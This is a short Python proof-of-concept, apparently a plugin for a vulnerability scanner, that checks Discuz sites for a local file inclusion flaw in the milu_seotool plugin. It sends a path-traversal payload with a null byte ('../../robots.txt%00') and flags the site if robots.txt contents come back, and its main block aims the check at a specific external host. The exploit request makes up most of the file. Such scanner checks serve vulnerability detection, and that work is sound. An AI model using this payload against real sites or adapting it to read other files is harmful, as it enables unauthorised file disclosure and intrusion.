#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""POC Name  :  Discuz milu_seotool 插件 本地文件包含漏洞Author :  haosen"""

def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    payload = 'plugin.php?id=milu_seotool:sitemap&myac=../../robots.txt%00'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and "User-agent" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://code.daociyiyou.biz/')[1])